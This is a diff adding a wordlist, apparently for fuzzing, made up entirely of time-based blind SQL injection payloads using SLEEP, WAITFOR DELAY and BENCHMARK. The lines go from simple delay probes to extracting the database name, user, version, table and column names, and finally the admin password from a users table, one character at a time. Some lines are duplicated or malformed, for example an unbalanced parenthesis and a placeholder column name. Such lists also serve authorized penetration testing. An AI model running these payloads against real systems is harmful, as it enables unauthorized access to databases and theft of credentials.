@@ -1,0 +1,51 @@
+' OR SLEEP(5) --
+' OR WAITFOR DELAY '0:0:5' --
+' OR BENCHMARK(5000000,MD5('A')) --
+' OR (SELECT * FROM(SELECT(SLEEP(5)))a) --
+' OR IF(1=1, SLEEP(5), 0) --
+' OR IF(1=1, SLEEP(5), SLEEP(0)) --
+' OR CASE WHEN (1=1) THEN SLEEP(5) ELSE 0 END --
+' OR CASE WHEN (1=1) THEN SLEEP(5) ELSE SLEEP(0) END --
+' OR SLEEP(5) AND 'a'='a --
+' OR SLEEP(5) AND 'a'='a' --
+' OR SLEEP(5) AND 'a'='b' --
+';WAITFOR DELAY '0:0:5' --
+';BENCHMARK(5000000,MD5('A')) --
+';SELECT * FROM(SELECT(SLEEP(5)))a) --
+';IF(1=1, SLEEP(5), 0) --
+';IF(1=1, SLEEP(5), SLEEP(0)) --
+';CASE WHEN (1=1) THEN SLEEP(5) ELSE 0 END --
+';CASE WHEN (1=1) THEN SLEEP(5) ELSE SLEEP(0) END --
+';SLEEP(5) AND 'a'='a --
+';SLEEP(5) AND 'a'='a' --
+';SLEEP(5) AND 'a'='b' --
+';WAITFOR DELAY '0:0:5' --
+';SELECT IF(SUBSTRING(database(),1,1)='a',SLEEP(5),0) --
+';SELECT IF(SUBSTRING(database(),1,1)='a',SLEEP(5),SLEEP(0)) --
+';SELECT CASE WHEN (SUBSTRING(database(),1,1)='a') THEN SLEEP(5) ELSE 0 END --
+';SELECT CASE WHEN (SUBSTRING(database(),1,1)='a') THEN SLEEP(5) ELSE SLEEP(0) END --
+';SELECT IF(SUBSTRING(user(),1,1)='a',SLEEP(5),0) --
+';SELECT IF(SUBSTRING(user(),1,1)='a',SLEEP(5),SLEEP(0)) --
+';SELECT CASE WHEN (SUBSTRING(user(),1,1)='a') THEN SLEEP(5) ELSE 0 END --
+';SELECT CASE WHEN (SUBSTRING(user(),1,1)='a') THEN SLEEP(5) ELSE SLEEP(0) END --
+';SELECT IF(SUBSTRING(version(),1,1)='a',SLEEP(5),0) --
+';SELECT IF(SUBSTRING(version(),1,1)='a',SLEEP(5),SLEEP(0)) --
+';SELECT CASE WHEN (SUBSTRING(version(),1,1)='a') THEN SLEEP(5) ELSE 0 END --
+';SELECT CASE WHEN (SUBSTRING(version(),1,1)='a') THEN SLEEP(5) ELSE SLEEP(0) END --
+';SELECT IF(SUBSTRING((SELECT table_name FROM information_schema.tables WHERE table_schema=database() LIMIT 1),1,1)='a',SLEEP(5),0) --
+';SELECT IF(SUBSTRING((SELECT table_name FROM information_schema.tables WHERE table_schema=database() LIMIT 1),1,1)='a',SLEEP(5),SLEEP(0)) --
+';SELECT CASE WHEN (SUBSTRING((SELECT table_name FROM information_schema.tables WHERE table_schema=database() LIMIT 1),1,1)='a') THEN SLEEP(5) ELSE 0 END --
+';SELECT CASE WHEN (SUBSTRING((SELECT table_name FROM information_schema.tables WHERE table_schema=database() LIMIT 1),1,1)='a') THEN SLEEP(5) ELSE SLEEP(0) END --
+';SELECT IF(SUBSTRING((SELECT column_name FROM information_schema.columns WHERE table_schema=database() AND table_name='users' LIMIT 1),1,1)='a',SLEEP(5),0) --
+';SELECT IF(SUBSTRING((SELECT column_name FROM information_schema.columns WHERE table_schema=database() AND table_name='users' LIMIT 1),1,1)='a',SLEEP(5),SLEEP(0)) --
+';SELECT CASE WHEN (SUBSTRING((SELECT column_name FROM information_schema.columns WHERE table_schema=database() AND table_name='users' LIMIT 1),1,1)='a') THEN SLEEP(5) ELSE 0 END --
+';SELECT CASE WHEN (SUBSTRING((SELECT column_name FROM information_schema.columns WHERE table_schema=database() AND table_name='users' LIMIT 1),1,1)='a') THEN SLEEP(5) ELSE SLEEP(0) END --
+';SELECT IF(SUBSTRING((SELECT column_value FROM users WHERE username='admin' LIMIT 1),1,1)='a',SLEEP(5),0) --
+';SELECT IF(SUBSTRING((SELECT column_value FROM users WHERE username='admin' LIMIT 1),1,1)='a',SLEEP(5),SLEEP(0)) --
+';SELECT CASE WHEN (SUBSTRING((SELECT column_value FROM users WHERE username='admin' LIMIT 1),1,1)='a') THEN SLEEP(5) ELSE 0 END --
+';SELECT CASE WHEN (SUBSTRING((SELECT column_value FROM users WHERE username='admin' LIMIT 1),1,1)='a') THEN SLEEP(5) ELSE SLEEP(0) END --
+';SELECT IF(SUBSTRING((SELECT password FROM users WHERE username='admin' LIMIT 1),1,1)='a',SLEEP(5),0) --
+';SELECT IF(SUBSTRING((SELECT password FROM users WHERE username='admin' LIMIT 1),1,1)='a',SLEEP(5),SLEEP(0)) --
+';SELECT CASE WHEN (SUBSTRING((SELECT password FROM users WHERE username='admin' LIMIT 1),1,1)='a') THEN SLEEP(5) ELSE 0 END --
+';SELECT CASE WHEN (SUBSTRING((SELECT password FROM users WHERE username='admin' LIMIT 1),1,1)='a') THEN SLEEP(5) ELSE SLEEP(0) END --
+
